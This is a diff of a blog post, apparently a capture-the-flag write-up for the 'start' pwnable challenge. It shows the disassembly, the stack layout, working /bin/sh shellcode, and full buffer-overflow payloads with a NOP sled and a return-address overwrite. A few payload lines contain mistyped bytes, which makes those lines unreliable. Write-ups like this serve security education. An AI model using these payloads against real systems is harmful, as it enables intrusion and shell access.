@@ -70,7 +70,7 @@
 
 <p class="post-metadata text-muted">
   28 June 2022 -  
-  <b>7 mins read time</b>
+  <b>11 mins read time</b>
 
   <br></p>
 
@@ -82,16 +82,16 @@
 
 <p>A typical buffer overflow attack with a little twist. For these first few challenges, I like to write in details so that I (and the readers) can remember the basic and fundamentals well.</p>
 
-<h2 id="1-initial-analysis">1. Initial Analysis</h2>
+<h2 id="1-initial-analysis"><u>1. Initial Analysis</u></h2>
 <p>First we get the type of the file.</p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>file start                                   
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>file start                                   
 start: ELF 32-bit LSB executable, Intel 80386, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, statically linked, not stripped
 </code></pre></div></div>
 <p>So it’s a 32-bit Little-endian ELF. So pop the binary into your Linux machine to analyze. Remember to chmod the binary:</p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">chmod</span> +x ./start
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">chmod</span> +x ./start
 </code></pre></div></div>
 <p>Open the binary in pwndbg:</p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>gdb <span class="nt">-q</span> ./start
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>gdb <span class="nt">-q</span> ./start
 pwndbg&gt; checksec
 <span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/home/dan09/CTF/Pwnable/start'</span>
     Arch:     i386-32-little
@@ -111,91 +111,210 @@ Non-debugging symbols:
 0x080490a4  _end  
 </code></pre></div></div>
 
-<h2 id="2-assembly-analysis">2. Assembly Analysis</h2>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwndbg&gt; start
+<h2 id="2-assembly-analysis"><u id="assembly-analysis">2. Assembly Analysis</u></h2>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwndbg&gt; start
 pwndbg&gt; disass
-Dump of assembler code for function _start:
 </code></pre></div></div>
-<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">0</span><span class="nf">x08048060</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;</span><span class="p">:</span>     <span class="nv">push</span>   <span class="nb">esp</span>                     <span class="o">//</span> <span class="nb">ESP</span> <span class="nv">is</span> <span class="nv">pushed</span> <span class="nv">to</span> <span class="nv">the</span> <span class="nv">stack</span>
-<span class="err">0</span><span class="nf">x08048061</span> <span class="o">&lt;+</span><span class="mi">1</span><span class="o">&gt;</span><span class="p">:</span>     <span class="nv">push</span>   <span class="mh">0x804809d</span>               <span class="o">//</span> <span class="nv">Push</span> <span class="nv">the</span> <span class="nv">address</span> <span class="nv">of</span> <span class="nv">exit</span> <span class="nv">function</span>
-<span class="err">0</span><span class="nf">x08048066</span> <span class="o">&lt;+</span><span class="mi">6</span><span class="o">&gt;</span><span class="p">:</span>     <span class="nv">xor</span>    <span class="nb">eax</span><span class="p">,</span><span class="nb">eax</span>                 <span class="o">//</span> <span class="nv">Zero</span> <span class="nv">out</span> <span class="nv">the</span> <span class="nv">register</span>
-<span class="err">0</span><span class="nf">x08048068</span> <span class="o">&lt;+</span><span class="mi">8</span><span class="o">&gt;</span><span class="p">:</span>     <span class="nv">xor</span>    <span class="nb">ebx</span><span class="p">,</span><span class="nb">ebx</span>
-<span class="err">0</span><span class="nf">x0804806a</span> <span class="o">&lt;+</span><span class="mi">10</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">xor</span>    <span class="nb">ecx</span><span class="p">,</span><span class="nb">ecx</span>
-<span class="err">0</span><span class="nf">x0804806c</span> <span class="o">&lt;+</span><span class="mi">12</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">xor</span>    <span class="nb">edx</span><span class="p">,</span><span class="nb">edx</span>
-<span class="err">0</span><span class="nf">x0804806e</span> <span class="o">&lt;+</span><span class="mi">14</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">push</span>   <span class="mh">0x3a465443</span>              <span class="o">//</span> <span class="nv">PUSH</span> <span class="nv">CTF</span>
-<span class="err">0</span><span class="nf">x08048073</span> <span class="o">&lt;+</span><span class="mi">19</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">push</span>   <span class="mh">0x20656874</span>              <span class="o">//</span> <span class="nv">PUSH</span> <span class="p">(</span><span class="s">'the '</span><span class="p">)</span>
-<span class="err">0</span><span class="nf">x08048078</span> <span class="o">&lt;+</span><span class="mi">24</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">push</span>   <span class="mh">0x20747261</span>              <span class="o">//</span> <span class="nv">PUSH</span> <span class="p">(</span><span class="s">'art '</span><span class="p">)</span>
-<span class="err">0</span><span class="nf">x0804807d</span> <span class="o">&lt;+</span><span class="mi">29</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">push</span>   <span class="mh">0x74732073</span>              <span class="o">//</span> <span class="nv">PUSH</span> <span class="p">(</span><span class="s">'s st'</span><span class="p">)</span>
-<span class="err">0</span><span class="nf">x08048082</span> <span class="o">&lt;+</span><span class="mi">34</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">push</span>   <span class="mh">0x2774654c</span>              <span class="o">//</span> <span class="nv">PUSH</span> <span class="p">(</span><span class="s">"Let'"</span><span class="p">)</span>
-<span class="err">0</span><span class="nf">x08048087</span> <span class="o">&lt;+</span><span class="mi">39</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">mov</span>    <span class="nb">ecx</span><span class="p">,</span><span class="nb">esp</span>                 <span class="o">//</span> <span class="nb">Ecx</span> <span class="nv">contains</span> <span class="nv">the</span> <span class="nb">ch</span><span class="nv">ar</span> <span class="nv">pointer</span> <span class="nv">to</span> <span class="nv">the</span> <span class="nv">string</span> <span class="nv">one</span> <span class="nv">wants</span> <span class="nv">to</span> <span class="nv">print.</span> <span class="nv">In</span> <span class="nv">this</span> <span class="nv">case</span> <span class="nv">it</span> <span class="nv">is</span> <span class="nv">the</span> <span class="nb">ESP</span><span class="nv">.</span>
-<span class="err">0</span><span class="nf">x08048089</span> <span class="o">&lt;+</span><span class="mi">41</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">mov</span>    <span class="nb">dl</span><span class="p">,</span><span class="mh">0x14</span>                 <span class="o">//</span> <span class="nb">dl</span> <span class="p">(</span><span class="nb">edx</span><span class="p">)</span> <span class="nv">contains</span> <span class="nv">the</span> <span class="nb">si</span><span class="nv">ze</span> <span class="nv">of</span> <span class="nv">the</span> <span class="nb">ch</span><span class="nv">ar</span> <span class="nv">array</span> <span class="nv">ones</span> <span class="nv">want</span> <span class="nv">to</span> <span class="nv">print.</span> <span class="mh">0x14</span> <span class="err">=</span> <span class="mi">20</span> <span class="kt">byte</span><span class="nv">s</span> <span class="nv">just</span> <span class="nv">enough</span> <span class="nv">for</span> <span class="nv">the</span> <span class="nv">string</span>
-<span class="err">0</span><span class="nf">x0804808b</span> <span class="o">&lt;+</span><span class="mi">43</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">mov</span>    <span class="nb">bl</span><span class="p">,</span><span class="mh">0x1</span>                  <span class="o">//</span> <span class="nb">bl</span> <span class="p">(</span><span class="nb">ebx</span><span class="p">)</span> <span class="nv">defines</span> <span class="nv">file</span> <span class="nv">descriptor.</span> <span class="mi">1</span> <span class="nv">means</span> <span class="nv">STDOUT</span>
-<span class="err">0</span><span class="nf">x0804808d</span> <span class="o">&lt;+</span><span class="mi">45</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">mov</span>    <span class="nb">al</span><span class="p">,</span><span class="mh">0x4</span>                  <span class="o">//</span> <span class="nb">al</span> <span class="p">(</span><span class="nb">eax</span><span class="p">)</span> <span class="nv">defines</span> <span class="nv">what</span> <span class="nv">type</span> <span class="nv">of</span> <span class="nv">syscall</span> <span class="nv">we</span> <span class="nv">want</span> <span class="nv">to</span> <span class="nv">make.</span> <span class="mi">4</span> <span class="nv">means</span> <span class="nv">write</span>
-<span class="err">0</span><span class="nf">x0804808f</span> <span class="o">&lt;+</span><span class="mi">47</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">int</span>    <span class="mh">0x80</span>                    <span class="o">//</span> <span class="mh">0x80</span> <span class="nv">is</span> <span class="nv">a</span> <span class="nv">syscall.</span> <span class="nv">Same</span> <span class="nv">stuff</span> <span class="nv">below</span>
-<span class="err">0</span><span class="nf">x08048091</span> <span class="o">&lt;+</span><span class="mi">49</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">xor</span>    <span class="nb">ebx</span><span class="p">,</span><span class="nb">ebx</span>                 <span class="o">//</span> <span class="nv">fd</span> <span class="err">=</span> <span class="mi">0</span> <span class="err">==</span><span class="o">&gt;</span> <span class="nv">STDIN</span>
-<span class="err">0</span><span class="nf">x08048093</span> <span class="o">&lt;+</span><span class="mi">51</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">mov</span>    <span class="nb">dl</span><span class="p">,</span><span class="mh">0x3c</span>                 <span class="o">//</span> <span class="nv">Read</span> <span class="nv">up</span> <span class="nv">to</span> <span class="mi">60</span> <span class="kt">byte</span><span class="nv">s</span> <span class="nv">from</span> <span class="nv">user</span> <span class="nv">input.</span>
-<span class="err">0</span><span class="nf">x08048095</span> <span class="o">&lt;+</span><span class="mi">53</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">mov</span>    <span class="nb">al</span><span class="p">,</span><span class="mh">0x3</span>                  <span class="o">//</span> <span class="mi">3</span> <span class="nv">means</span> <span class="nv">read.</span>
-<span class="err">0</span><span class="nf">x08048097</span> <span class="o">&lt;+</span><span class="mi">55</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">int</span>    <span class="mh">0x80</span>                    <span class="o">//</span> <span class="nv">syscall</span><span class="p">,</span> <span class="nv">the</span> <span class="nv">missing</span> <span class="nb">ecx</span> <span class="nv">is</span> <span class="nv">taken</span> <span class="nv">from</span> <span class="nv">the</span> <span class="nv">above</span><span class="p">,</span> <span class="nv">which</span> <span class="nv">means</span> <span class="nv">user</span> <span class="nv">input</span> <span class="nv">will</span> <span class="nv">be</span> <span class="nv">written</span> <span class="nv">to</span> <span class="nv">the</span> <span class="nv">stack.</span>
-<span class="err">0</span><span class="nf">x08048099</span> <span class="o">&lt;+</span><span class="mi">57</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">add</span>    <span class="nb">esp</span><span class="p">,</span><span class="mh">0x14</span>                <span class="o">//</span> <span class="nb">cl</span><span class="nv">ean</span> <span class="nv">stack</span>
-<span class="err">0</span><span class="nf">x0804809c</span> <span class="o">&lt;+</span><span class="mi">60</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">ret</span> 
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">Dump of assembler code for function _start</span><span class="pi">:</span>
+<span class="s">0x08048060 &lt;+0&gt;</span><span class="pi">:</span>     <span class="s">push   esp                     // ESP is pushed to the stack</span>
+<span class="s">0x08048061 &lt;+1&gt;</span><span class="pi">:</span>     <span class="s">push   0x804809d               // Push the address of exit func</span>
+<span class="s">0x08048066 &lt;+6&gt;</span><span class="pi">:</span>     <span class="s">xor    eax,eax                 // Zero out the register</span>
+<span class="s">0x08048068 &lt;+8&gt;</span><span class="pi">:</span>     <span class="s">xor    ebx,ebx</span>
+<span class="s">0x0804806a &lt;+10&gt;</span><span class="pi">:</span>    <span class="s">xor    ecx,ecx</span>
+<span class="s">0x0804806c &lt;+12&gt;</span><span class="pi">:</span>    <span class="s">xor    edx,edx</span>
+<span class="s">0x0804806e &lt;+14&gt;</span><span class="pi">:</span>    <span class="s">push   0x3a465443              // PUSH CTF</span>
+<span class="s">0x08048073 &lt;+19&gt;</span><span class="pi">:</span>    <span class="s">push   0x20656874              // PUSH ('the ')</span>
+<span class="s">0x08048078 &lt;+24&gt;</span><span class="pi">:</span>    <span class="s">push   0x20747261              // PUSH ('art ')</span>
+<span class="s">0x0804807d &lt;+29&gt;</span><span class="pi">:</span>    <span class="s">push   0x74732073              // PUSH ('s st')</span>
+<span class="s">0x08048082 &lt;+34&gt;</span><span class="pi">:</span>    <span class="s">push   0x2774654c              // PUSH ("Let'")</span>
+<span class="s">0x08048087 &lt;+39&gt;</span><span class="pi">:</span>    <span class="s">mov    ecx,esp                 // Ecx contains the char pointer to the string one wants to print. In this case it is the ESP.</span>
+<span class="s">0x08048089 &lt;+41&gt;</span><span class="pi">:</span>    <span class="s">mov    dl,0x14                 // dl (edx) contains the size of the char array ones want to print. 0x14 = 20 bytes just enough for the string</span>
+<span class="s">0x0804808b &lt;+43&gt;</span><span class="pi">:</span>    <span class="s">mov    bl,0x1                  // bl (ebx) defines file descriptor. 1 means STDOUT</span>
+<span class="s">0x0804808d &lt;+45&gt;</span><span class="pi">:</span>    <span class="s">mov    al,0x4                  // al (eax) defines what type of syscall we want to make. 4 means write</span>
+<span class="s">0x0804808f &lt;+47&gt;</span><span class="pi">:</span>    <span class="s">int    0x80                    // 0x80 is a syscall. Same stuff below</span>
+<span class="s">0x08048091 &lt;+49&gt;</span><span class="pi">:</span>    <span class="s">xor    ebx,ebx                 // fd = 0 ==&gt; STDIN</span>
+<span class="s">0x08048093 &lt;+51&gt;</span><span class="pi">:</span>    <span class="s">mov    dl,0x3c                 // Read up to 60 bytes from user input.</span>
+<span class="s">0x08048095 &lt;+53&gt;</span><span class="pi">:</span>    <span class="s">mov    al,0x3                  // 3 means read.</span>
+<span class="s">0x08048097 &lt;+55&gt;</span><span class="pi">:</span>    <span class="s">int    0x80                    // syscall, the missing ecx is taken from the above, which means user input will be written to the stack.</span>
+<span class="s">0x08048099 &lt;+57&gt;</span><span class="pi">:</span>    <span class="s">add    esp,0x14                // clean stack</span>
+<span class="s">0x0804809c &lt;+60&gt;</span><span class="pi">:</span>    <span class="s">ret</span> 
 </code></pre></div></div>
 
 <p>Understand the code and you can move on to the next step.</p>
 
-<h2 id="3-exploitation">3. Exploitation</h2>
+<h2 id="3-exploitation"><u>3. Exploitation</u></h2>
 
-<h4 id="locating-the-buffer">Locating the buffer</h4>
+<h3 id="31-locating-the-buffer"><i>3.1 Locating the buffer</i></h3>
 <p>In order to overflow the buffer, we have to know where it is. As you can see the syscall write has ecx denoting the start of the buffer. The size of the buffer is 20 bytes.</p>
 
 <p>[Add image here]</p>
 
 <p>Let’s focus on these instructions, which is where you can give input:</p>
 
-<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">0</span><span class="nf">x08048091</span> <span class="o">&lt;+</span><span class="mi">49</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">xor</span>    <span class="nb">ebx</span><span class="p">,</span><span class="nb">ebx</span>         <span class="o">//</span> <span class="nv">fd</span> <span class="err">=</span> <span class="mi">0</span> <span class="err">==</span><span class="o">&gt;</span> <span class="nv">STDIN</span>
-<span class="err">0</span><span class="nf">x08048093</span> <span class="o">&lt;+</span><span class="mi">51</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">mov</span>    <span class="nb">dl</span><span class="p">,</span><span class="mh">0x3c</span>         <span class="o">//</span> <span class="nv">Read</span> <span class="nv">up</span> <span class="nv">to</span> <span class="mi">60</span> <span class="kt">byte</span><span class="nv">s</span> <span class="nv">from</span> <span class="nv">user</span> <span class="nv">input.</span>
-<span class="err">0</span><span class="nf">x08048095</span> <span class="o">&lt;+</span><span class="mi">53</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">mov</span>    <span class="nb">al</span><span class="p">,</span><span class="mh">0x3</span>          <span class="o">//</span> <span class="mi">3</span> <span class="nv">means</span> <span class="nv">read.</span>
-<span class="err">0</span><span class="nf">x08048097</span> <span class="o">&lt;+</span><span class="mi">55</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">int</span>    <span class="mh">0x80</span>            <span class="o">//</span> <span class="nv">syscall</span><span class="p">,</span> <span class="nv">the</span> <span class="nv">missing</span> <span class="nb">ecx</span> <span class="nv">is</span> <span class="nv">taken</span> <span class="nv">from</span> <span class="nv">the</span> <span class="nv">above</span><span class="p">,</span> <span class="nv">which</span> <span class="nv">means</span> <span class="nv">user</span> <span class="nv">input</span> <span class="nv">will</span> <span class="nv">be</span> <span class="nv">written</span> <span class="nv">to</span> <span class="nv">the</span> <span class="nv">stack.</span>
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">0x08048091 &lt;+49&gt;</span><span class="pi">:</span>    <span class="s">xor    ebx,ebx         // fd = 0 ==&gt; STDIN</span>
+<span class="s">0x08048093 &lt;+51&gt;</span><span class="pi">:</span>    <span class="s">mov    dl,0x3c         // Read up to 60 bytes from user input.</span>
+<span class="s">0x08048095 &lt;+53&gt;</span><span class="pi">:</span>    <span class="s">mov    al,0x3          // 3 means read.</span>
+<span class="s">0x08048097 &lt;+55&gt;</span><span class="pi">:</span>    <span class="s">int    0x80            // syscall, the missing ecx is taken from the above, which means user input will be written to the stack.</span>
 </code></pre></div></div>
 
 <p>So whatever you input will overwrite the stack defined by the instructions before. I inputed test and you can see what happens to the stack below.</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>──────────────────────────────────────[ STACK ]───────────────────────────────────────────────
-00:0000│ ecx esp 0xffffce04 ◂— 0x74736574 ('test')
-01:0004│         0xffffce08 ◂— 0x7473200a ('\n st')
-02:0008│         0xffffce0c ◂— 0x20747261 ('art ')
-03:000c│         0xffffce10 ◂— 0x20656874 ('the ')
-04:0010│         0xffffce14 ◂— 0x3a465443 ('CTF:')
-05:0014│         0xffffce18 —▸ 0x804809d (_exit) ◂— pop    esp
-06:0018│         0xffffce1c —▸ 0xffffce20 ◂— 0x1
-07:001c│         0xffffce20 ◂— 0x1
+<div class="language-ps highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">──────────────────────────────────────</span><span class="p">[</span> <span class="nf">STACK</span> <span class="p">]</span><span class="nf">───────────────────────────────────────────────</span>
+<span class="nf">00:0000│</span> <span class="nf">ecx</span> <span class="nf">esp</span> <span class="nf">0xffffce04</span> <span class="nf">◂—</span> <span class="nf">0x74736574</span> <span class="s">('test')</span>
+<span class="nf">01:0004│</span>         <span class="nf">0xffffce08</span> <span class="nf">◂—</span> <span class="nf">0x7473200a</span> <span class="s">('</span><span class="se">\n</span><span class="s"> st')</span>
+<span class="nf">02:0008│</span>         <span class="nf">0xffffce0c</span> <span class="nf">◂—</span> <span class="nf">0x20747261</span> <span class="s">('art ')</span>
+<span class="nf">03:000c│</span>         <span class="nf">0xffffce10</span> <span class="nf">◂—</span> <span class="nf">0x20656874</span> <span class="s">('the ')</span>
+<span class="nf">04:0010│</span>         <span class="nf">0xffffce14</span> <span class="nf">◂—</span> <span class="nf">0x3a465443</span> <span class="s">('CTF:')</span>
+<span class="nf">05:0014│</span>         <span class="nf">0xffffce18</span> <span class="nf">—▸</span> <span class="nf">0x804809d</span> <span class="s">(_exit)</span> <span class="nf">◂—</span> <span class="nb">pop</span>    <span class="nf">esp</span>
+<span class="nf">06:0018│</span>         <span class="nf">0xffffce1c</span> <span class="nf">—▸</span> <span class="nf">0xffffce20</span> <span class="nf">◂—</span> <span class="nf">0x1</span>
+<span class="nf">07:001c│</span>         <span class="nf">0xffffce20</span> <span class="nf">◂—</span> <span class="nf">0x1</span>
 </code></pre></div></div>
 
 <p>The following instructions clean ups 20 bytes the stack, essentially leaves the ret at 0xffffce18 —▸ 0x804809d (_exit) ◂— pop    esp</p>
-<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">0</span><span class="nf">x08048099</span> <span class="o">&lt;+</span><span class="mi">57</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">add</span>    <span class="nb">esp</span><span class="p">,</span><span class="mh">0x14</span>                <span class="o">//</span> <span class="nb">cl</span><span class="nv">ean</span> <span class="nv">stack</span>
-<span class="err">0</span><span class="nf">x0804809c</span> <span class="o">&lt;+</span><span class="mi">60</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">ret</span> 
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">0x08048099 &lt;+57&gt;</span><span class="pi">:</span>    <span class="s">add    esp,0x14                // clean stack</span>
+<span class="s">0x0804809c &lt;+60&gt;</span><span class="pi">:</span>    <span class="s">ret</span> 
 </code></pre></div></div>
 
 <p>So our mission is to overflow the 0xffffce18 address (the _exit function) and it will return to whatever address we want. We have a padding of 20 bytes and 4 bytes payload to overwrite the address.</p>
 
-<h4 id="overwrite-the-return-address">Overwrite the return address</h4>
-<p>So what do we overwrite the return address with? The payload can’t be simply AAAAAAAAAAAAAAAAAAAA + buffer address since it will just jump to a bunch of As. Maybe we can do something like this:</p>
+<h3 id="32-overwrite-the-return-address"><i>3.2 Overwrite the return address</i></h3>
+<p>So what do we overwrite the return address with? The payload can’t be simply AAAAAAAAAAAAAAAAAAAA + buffer address since it will just jump to a bunch of As. We can do something like this:</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  AAAAA...AAAAAAA        +       shellcode address       +       nop sled  +      shellcode
-────────────────────           ────────────────────
-         ▼                              ▼
-  20 As of padding                4bytes overflowing ret
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  AAAAA...AAAAAAA        +       overwrite address       +            nop sled                   +      shellcode
+────────────────────           ────────────────────             ────────────────────
+         ▼                              ▼                                 ▼
+  20 As of padding              Address of NOP sled          \x90\x90\x90 (dont use too much nop or the sled will 
+                                                                  overflow too much and weird things will 
+                                                                  overwrite the sled on the stack)
 </code></pre></div></div>
 
 <p>Just search for shellcode on Google and get the 28 bytes one.</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>\x31\xc0\x50\x68\x2f\x2f\x73
-\x68\x68\x2f\x62\x69\x6e\x89
-\xe3\x89\xc1\x89\xc2\xb0\x0b
-\xcd\x80\x31\xc0\x40\xcd\x80
+<div class="language-ps highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">\x31\xc0\x50\x68\x2f\x2f\x73</span>
+<span class="nf">\x68\x68\x2f\x62\x69\x6e\x89</span>
+<span class="nf">\xe3\x89\xc1\x89\xc2\xb0\x0b</span>
+<span class="nf">\xcd\x80\x31\xc0\x40\xcd\x80</span>
 </code></pre></div></div>
 
-<p>Now we try to locate the address of the nop sled.</p>
+<p>Here is the payload</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>AAAAAAAAAAAAAAAAAAAABBBB\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
+<div class="language-ps highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">AAAAAAAAAAAAAAAAAAAA</span><span class="p">[</span><span class="mf">4</span> <span class="nf">bytes</span> <span class="nf">of</span> <span class="nf">the</span> <span class="nf">address</span> <span class="nf">containing</span> <span class="nf">nop</span> <span class="nf">sled</span><span class="p">]</span><span class="nf">\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80</span>
+</code></pre></div></div>
+
+<p>We still have to figure out the address of the NOP sled. On our local machine it’s easy to just inspect the stack and find where the \x90\x90\x90\x90 lands. Use the command below for submitting input automatically.</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">pwndbg&gt; r &lt; &lt;(echo -ne "AAAAAAAAAAAAAAAAAAAABBBB\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80")</span>
+<span class="na">Starting program</span><span class="pi">:</span> <span class="s">/home/dan09/CTF/Pwnable/start &lt; &lt;(echo -ne "AAAAAAAAAAAAAAAAAAAABBBB\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80")</span>
+<span class="s">Let's start the CTF</span><span class="pi">:</span>
+</code></pre></div></div>
+
+<p>Inspecting the stack after injecting the above we can see the nop sled lies at 0xffffce2c.</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">pwndbg&gt; telescope 40 $esp</span>
+<span class="s">00:0000│ ecx esp 0xffffce14 ◂— 0x41414141 ('AAAA')</span>
+<span class="nn">...</span> <span class="s">↓            4 skipped</span>
+<span class="s">05:0014│         0xffffce28 ◂— 0x42424242 ('BBBB')</span>
+<span class="s">06:0018│         0xffffce2c ◂— 0x90909090</span>
+<span class="s">07:001c│         0xffffce30 ◂— 0xc0319090</span>
+<span class="s">08:0020│         0xffffce34 ◂— 0x2f2f6850 ('Ph//')</span>
+<span class="s">09:0024│         0xffffce38 ◂— 0x2f686873 ('shh/')</span>
+<span class="s">0a:0028│         0xffffce3c ◂— 0x896e6962</span>
+<span class="s">0b:002c│         0xffffce40 ◂— 0x89c189e3</span>
+<span class="s">0c:0030│         0xffffce44 ◂— 0xcd0bb0c2</span>
+<span class="s">0d:0034│         0xffffce48 ◂— 0x40c03180</span>
+</code></pre></div></div>
+
+<p>Change the payload and starts injecting, we can then have a shell:</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">pwndbg&gt; r &lt; &lt;(echo -ne "AAAAAAAAAAAAAAAAAAAA\x2c\xce\xff\xff\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x8\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80")</span>
+<span class="na">Starting program</span><span class="pi">:</span> <span class="s">/home/dan09/CTF/Pwnable/start &lt; &lt;(echo -ne "AAAAAAAAAAAAAAAAAAAA\x2c\xce\xff\xff\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xc\x80")</span>
+<span class="s">Let's start the CTF:process 3058 is executing new program</span><span class="pi">:</span> <span class="s">/usr/bin/dash</span>
+<span class="pi">[</span><span class="nv">Inferior 1 (process 3058) exited normally</span><span class="pi">]</span>
+</code></pre></div></div>
+
+<h3 id="33-sounds-good-doesnt-work"><i>3.3 Sounds good, doesn’t work</i></h3>
+<p>All that work but we still have no clue regarding the nop sled address on the server.</p>
+
+<p>At this stage, we can’t even exploit the binary running locally since the address we got from the above is altered now (<i>there is no pwndbg elements on the stack</i>). More info <a href="https://stackoverflow.com/questions/17775186/buffer-overflow-works-in-gdb-but-not-without-it">here.</a></p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">echo</span> <span class="nt">-ne</span> <span class="s2">"AAAAAAAAAAAAAAAAAAAA</span><span class="se">\x</span><span class="s2">2c</span><span class="se">\x</span><span class="s2">ce</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">90</span><span class="se">\x</span><span class="s2">90</span><span class="se">\x</span><span class="s2">90</span><span class="se">\x</span><span class="s2">90</span><span class="se">\x</span><span class="s2">90</span><span class="se">\x</span><span class="s2">90</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">69</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">c1</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">c2</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">40</span><span class="se">\x</span><span class="s2">c</span><span class="se">\x</span><span class="s2">80"</span> | ./start
+Lets start the CTF:zsh: <span class="k">done                </span><span class="nb">echo</span> <span class="nt">-ne</span>  | 
+zsh: segmentation fault  ./start
+</code></pre></div></div>
+
